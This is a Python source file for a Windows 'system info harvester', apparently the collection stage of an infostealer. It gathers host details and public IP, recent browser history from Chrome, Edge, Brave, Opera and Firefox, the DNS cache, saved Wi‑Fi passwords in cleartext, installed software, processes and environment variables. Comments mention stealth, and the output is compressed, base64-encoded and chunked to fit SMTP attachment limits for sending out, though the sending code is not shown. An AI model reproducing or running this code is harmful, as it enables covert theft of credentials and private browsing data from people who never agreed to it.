#!/usr/bin/env python3
"""
Modular system info harvester (improvised version).

Improvements over original:
  - Pluggable collectors with availability checks
  - Multi-browser history (Chrome, Edge, Brave, Opera, Firefox)
  - Chrome DB lock workaround (copy on lock)
  - Locale‑agnostic Wi‑Fi parsing (netsh XML export fallback)
  - Installed software extraction from registry
  - PowerShell availability fallback for DNS cache
  - Selected environment variables only (stealth)
  - Dependency fallbacks (psutil, requests via urllib)
  - zlib compression + Base64, chunking for large logs
  - Pathlib everywhere
  - Proper timeouts and retries
"""

import base64
import logging
import os
import re
import shutil
import sqlite3
import subprocess
import tempfile
import time
import zlib
from abc import ABC, abstractmethod
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from xml.etree import ElementTree

# ----------------------------------------------------------------------
#  Configure minimal logging (off by default, enable for debugging)
# ----------------------------------------------------------------------
logging.basicConfig(level=logging.WARNING, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# ----------------------------------------------------------------------
#  Base collector
# ----------------------------------------------------------------------
class BaseCollector(ABC):
    """Abstract base for all information collectors."""
    def __init__(self, enabled: bool = True):
        self.enabled = enabled

    @abstractmethod
    def is_available(self) -> bool:
        """Check if this collector can run in the current environment."""
        ...

    @abstractmethod
    def collect(self) -> str:
        """Return collected data as a string, or empty on failure."""
        ...


# ----------------------------------------------------------------------
#  1. Host info (systeminfo + public IP)
# ----------------------------------------------------------------------
class HostInfoCollector(BaseCollector):
    def is_available(self) -> bool:
        # systeminfo is almost always available on Windows
        return True

    def collect(self) -> str:
        log = ''
        try:
            result = subprocess.run(
                ['systeminfo'], capture_output=True, text=True, shell=False, timeout=30
            )
            log += result.stdout + '\n'
        except Exception as e:
            log += f'Host info (systeminfo) failed: {e}\n'

        log += self._get_public_ip()
        return log

    def _get_public_ip(self) -> str:
        for url, use_std_lib in [
            ('https://api.ipify.org', False),
            ('https://ifconfig.me/ip', False),
        ]:
            try:
                if use_std_lib:
                    import urllib.request
                    with urllib.request.urlopen(url, timeout=5) as resp:
                        ip = resp.read().decode().strip()
                else:
                    try:
                        from requests import get
                        ip = get(url, timeout=5).text.strip()
                    except ImportError:
                        import urllib.request
                        with urllib.request.urlopen(url, timeout=5) as resp:
                            ip = resp.read().decode().strip()
                return f'Public IP: {ip}\n'
            except Exception as e:
                logger.debug('Public IP attempt failed: %s', e)
        return 'Public IP: unavailable\n'


# ----------------------------------------------------------------------
#  2. Browser history (multi‑browser, copy‑on‑lock)
# ----------------------------------------------------------------------
class BrowserHistoryCollector(BaseCollector):
    # Define supported browsers: (name, glob pattern for profile)
    BROWSERS = [
        ('Chrome',  r'~\AppData\Local\Google\Chrome\User Data\Default'),
        ('Edge',    r'~\AppData\Local\Microsoft\Edge\User Data\Default'),
        ('Brave',   r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default'),
        ('Opera',   r'~\AppData\Roaming\Opera Software\Opera Stable\Default'),
        # Firefox uses places.sqlite, handled separately
    ]
    FIREFOX_PROFILE_GLOB = r'~\AppData\Roaming\Mozilla\Firefox\Profiles\*'

    def is_available(self) -> bool:
        return True  # always attempt; will return partial if nothing found

    def collect(self) -> str:
        log = '\nBrowser history:\n'
        found_any = False

        # Chromium‑based browsers
        for name, pattern in self.BROWSERS:
            profile_dir = Path(pattern).expanduser().resolve()
            history_db = profile_dir / 'history'
            if history_db.exists():
                found_any = True
                log += f'\n--- {name} ---\n'
                log += self._extract_chromium_history(history_db)

        # Firefox
        ff_profile_dirs = list(Path(self.FIREFOX_PROFILE_GLOB).expanduser().parent.glob('*'))
        for profile in ff_profile_dirs:
            places_db = profile / 'places.sqlite'
            if places_db.exists():
                found_any = True
                log += f'\n--- Firefox ({profile.name}) ---\n'
                log += self._extract_firefox_history(places_db)

        if not found_any:
            log += 'No browser history found.\n'
        return log

    def _extract_chromium_history(self, db_path: Path) -> str:
        log = ''
        try:
            # If locked, copy to a temp file first
            if self._is_db_locked(db_path):
                tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.sqlite')
                shutil.copy2(db_path, tmp.name)
                db_path = Path(tmp.name)

            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()

            threshold = datetime.now() - timedelta(minutes=30)
            threshold_micros = int(threshold.timestamp() * 1_000_000)

            query = (
                'SELECT urls.url, MAX(visits.visit_time) '
                'FROM urls, visits '
                'WHERE urls.id = visits.url AND urls.hidden = 0 '
                'AND visits.visit_time > ? '
                'GROUP BY urls.url '
                'ORDER BY MAX(visits.visit_time) DESC '
                'LIMIT 100'
            )
            cursor.execute(query, (threshold_micros,))
            for url, last_visit in cursor.fetchall():
                visit_time = datetime.fromtimestamp(last_visit / 1_000_000)
                log += f'URL: {url}\n  Last Visit: {visit_time}\n'

            cursor.close()
            conn.close()
        except sqlite3.OperationalError as e:
            log += f'Could not read database: {e}\n'
        except Exception as e:
            log += f'Unexpected error: {e}\n'
        finally:
            if 'tmp' in locals():
                Path(tmp.name).unlink(missing_ok=True)
        return log

    def _extract_firefox_history(self, places_db: Path) -> str:
        log = ''
        try:
            conn = sqlite3.connect(str(places_db))
            cursor = conn.cursor()
            threshold = datetime.now() - timedelta(minutes=30)
            threshold_micros = int(threshold.timestamp() * 1_000_000)

            query = (
                'SELECT url, last_visit_date FROM moz_places '
                'WHERE last_visit_date > ? '
                'ORDER BY last_visit_date DESC LIMIT 100'
            )
            cursor.execute(query, (threshold_micros,))
            for url, last_visit in cursor.fetchall():
                visit_time = datetime.fromtimestamp(last_visit / 1_000_000)
                log += f'URL: {url}\n  Last Visit: {visit_time}\n'

            cursor.close()
            conn.close()
        except Exception as e:
            log += f'Could not read Firefox history: {e}\n'
        return log

    @staticmethod
    def _is_db_locked(db_path: Path) -> bool:
        """Quick test: try connecting; if operational error, assume locked."""
        try:
            conn = sqlite3.connect(str(db_path))
            conn.close()
            return False
        except sqlite3.OperationalError:
            return True


# ----------------------------------------------------------------------
#  3. DNS cache (PowerShell with ipconfig fallback)
# ----------------------------------------------------------------------
class DNSCacheCollector(BaseCollector):
    def is_available(self) -> bool:
        return True  # fallback always works

    def collect(self) -> str:
        log = '\nDNS cache:\n'
        if self._powershell_available():
            log += self._collect_powershell()
        else:
            log += self._collect_ipconfig()
        return log

    def _powershell_available(self) -> bool:
        try:
            subprocess.run(
                ['powershell', '-Command', 'Write-Host test'],
                capture_output=True, timeout=5, shell=False
            )
            return True
        except Exception:
            return False

    def _collect_powershell(self) -> str:
        try:
            result = subprocess.run(
                ['powershell', 'Get-DnsClientCache | Format-Table -AutoSize'],
                capture_output=True, text=True, shell=False, timeout=10
            )
            return result.stdout.strip() + '\n' if result.stdout.strip() else 'No DNS cache entries.\n'
        except Exception as e:
            return f'PowerShell DNS collection failed: {e}\n'

    def _collect_ipconfig(self) -> str:
        try:
            result = subprocess.run(
                ['ipconfig', '/displaydns'],
                capture_output=True, text=True, shell=False, timeout=10
            )
            # Basic cleaning – just return the raw output
            return result.stdout if result.stdout.strip() else 'No DNS cache.\n'
        except Exception as e:
            return f'ipconfig fallback failed: {e}\n'


# ----------------------------------------------------------------------
#  4. Wi‑Fi profiles & passwords (locale‑agnostic via XML export)
# ----------------------------------------------------------------------
class WiFiCollector(BaseCollector):
    def is_available(self) -> bool:
        # netsh wlan works only if wireless adapter exists
        try:
            subprocess.run(['netsh', 'wlan', 'show', 'interfaces'],
                           capture_output=True, shell=False, timeout=5)
            return True
        except Exception:
            return False

    def collect(self) -> str:
        log = '\nWiFi Information:\n'
        try:
            # Export all profiles to XML files in a temp directory
            tmp_dir = Path(tempfile.mkdtemp())
            subprocess.run(
                ['netsh', 'wlan', 'export', 'profile', 'folder=' + str(tmp_dir), 'key=clear'],
                capture_output=True, shell=False, timeout=15
            )
            for xml_file in tmp_dir.glob('*.xml'):
                try:
                    tree = ElementTree.parse(xml_file)
                    ns = {'w': 'http://www.microsoft.com/networking/WLAN/profile/v1'}
                    ssid = tree.find('.//w:name', ns).text
                    key = tree.find('.//w:keyMaterial', ns)
                    password = key.text if key is not None else 'No password'
                    log += f'WiFi ID = {ssid} | Password = {password}\n'
                except Exception:
                    log += f'Failed to parse {xml_file.name}\n'
                finally:
                    xml_file.unlink(missing_ok=True)
            tmp_dir.rmdir()
        except Exception as e:
            log += f'WiFi info error: {e}\n'
        return log


# ----------------------------------------------------------------------
#  5. Installed software (from registry, fast parsing)
# ----------------------------------------------------------------------
class InstalledSoftwareCollector(BaseCollector):
    REG_PATHS = [
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        r'HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
        r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
    ]

    def is_available(self) -> bool:
        return True  # registry always available

    def collect(self) -> str:
        log = '\nInstalled Software:\n'
        software = set()

        for reg_path in self.REG_PATHS:
            try:
                result = subprocess.run(
                    ['reg', 'query', reg_path, '/s', '/f', 'DisplayName'],
                    capture_output=True, text=True, shell=False, timeout=15
                )
                # Simple regex to extract DisplayName REG_SZ value
                matches = re.findall(r'DisplayName\s+REG_SZ\s+(.+)', result.stdout)
                software.update(name.strip() for name in matches)
            except Exception:
                continue

        if software:
            log += '\n'.join(sorted(software)) + '\n'
        else:
            log += 'No installed software found.\n'
        return log


# ----------------------------------------------------------------------
#  6. Running processes (with optional psutil, fallback to tasklist)
# ----------------------------------------------------------------------
class RunningProcessesCollector(BaseCollector):
    def is_available(self) -> bool:
        return True  # tasklist fallback always works

    def collect(self) -> str:
        log = '\nRunning Processes:\n'
        if self._psutil_available():
            log += self._collect_psutil()
        else:
            log += self._collect_tasklist()
        return log

    def _psutil_available(self) -> bool:
        try:
            import psutil
            return True
        except ImportError:
            return False

    def _collect_psutil(self) -> str:
        try:
            import psutil
            lines = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                lines.append(f"{proc.info['name']} (PID: {proc.info['pid']}, User: {proc.info['username']})")
            return '\n'.join(lines) + '\n'
        except Exception as e:
            return f'psutil error: {e}\n'

    def _collect_tasklist(self) -> str:
        try:
            result = subprocess.run(
                ['tasklist', '/V', '/FO', 'CSV', '/NH'],
                capture_output=True, text=True, shell=False, timeout=10
            )
            return result.stdout
        except Exception as e:
            return f'tasklist failed: {e}\n'


# ----------------------------------------------------------------------
#  7. Environment variables (filtered for stealth)
# ----------------------------------------------------------------------
class EnvironmentCollector(BaseCollector):
    # Only collect these variables (add/remove as needed)
    INTERESTING_VARS = [
        'ALLUSERSPROFILE', 'APPDATA', 'COMPUTERNAME', 'HOMEDRIVE',
        'HOMEPATH', 'LOCALAPPDATA', 'LOGONSERVER', 'NUMBER_OF_PROCESSORS',
        'OS', 'PATH', 'PATHEXT', 'PROCESSOR_ARCHITECTURE', 'PROCESSOR_IDENTIFIER',
        'PROCESSOR_LEVEL', 'PROCESSOR_REVISION', 'PSModulePath',
        'PUBLIC', 'SESSIONNAME', 'SystemDrive', 'SystemRoot',
        'TEMP', 'TMP', 'USERDNSDOMAIN', 'USERDOMAIN', 'USERNAME',
        'USERPROFILE', 'WINDIR',
    ]

    def is_available(self) -> bool:
        return True

    def collect(self) -> str:
        log = '\nEnvironment Variables:\n'
        for var in self.INTERESTING_VARS:
            value = os.environ.get(var)
            if value is not None:
                log += f'{var}={value}\n'
        return log


# ----------------------------------------------------------------------
#  Orchestrator: fetch_info
# ----------------------------------------------------------------------
def fetch_info(output_path: str, max_chunk_bytes: int = 900_000) -> List[str]:
    """
    Run all enabled collectors, compress, base64‑encode, and optionally
    split into chunks. Returns a list of file paths (one if no split).

    Args:
        output_path: Base path for the output file (without chunk suffix).
        max_chunk_bytes: Max size for a single chunk. Default ~900 KB to stay
                         under SMTP attachment limits.

    Returns:
        List of Pathlib objects representing the written chunk(s).
    """
    # Instantiate collectors – toggle enabled=True/False as needed
    collectors: List[BaseCollector] = [
        HostInfoCollector(),
        BrowserHistoryCollector(),
        DNSCacheCollector(),
        WiFiCollector(),
        InstalledSoftwareCollector(),
        RunningProcessesCollector(),
        EnvironmentCollector(),
    ]

    log = ''
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log += f'=== System Report {timestamp} ===\n'

    for collector in collectors:
        if not collector.enabled:
            continue
        try:
            if collector.is_available():
                log += collector.collect()
            else:
                log += f'\n[{collector.__class__.__name__}] skipped – unavailable.\n'
        except Exception as e:
            log += f'\n[{collector.__class__.__name__}] error: {e}\n'

    # Compress and encode
    compressed = zlib.compress(log.encode('utf-8'), level=9)
    encoded = base64.b64encode(compressed).decode()

    # Chunking
    base_path = Path(output_path)
    if len(encoded) <= max_chunk_bytes:
        chunk_paths = [base_path]
        with open(base_path, 'w', encoding='utf-8') as f:
            f.write(encoded)
    else:
        chunk_paths = []
        for i in range(0, len(encoded), max_chunk_bytes):
            chunk = encoded[i:i+max_chunk_bytes]
            chunk_path = base_path.with_name(f'{base_path.stem}_part{i//max_chunk_bytes + 1}{base_path.suffix}')
            with open(chunk_path, 'w', encoding='utf-8') as f:
                f.write(chunk)
            chunk_paths.append(chunk_path)

    logger.info('Report saved to %d file(s)', len(chunk_paths))
    return [str(p) for p in chunk_paths]


# ----------------------------------------------------------------------
#  Test helper (if run directly)
# ----------------------------------------------------------------------
def test():
    """Minimal test: collect and print first 1000 chars of decoded result."""
    # Write to a temp file
    test_path = str(Path(tempfile.gettempdir()) / 'test_sysinfo.txt')
    chunks = fetch_info(test_path)
    print(f'Generated {len(chunks)} chunk(s).')

    # Read first chunk and decode + decompress for preview
    with open(chunks[0], 'r', encoding='utf-8') as f:
        raw = f.read()
    try:
        decompressed = zlib.decompress(base64.b64decode(raw)).decode('utf-8')
        # print('--- Preview (first 2000 chars) ---')
        # print(decompressed[:2000])
        print(decompressed)
    except Exception as e:
        print(f'Decoding failed: {e}')

if __name__ == '__main__':
    test()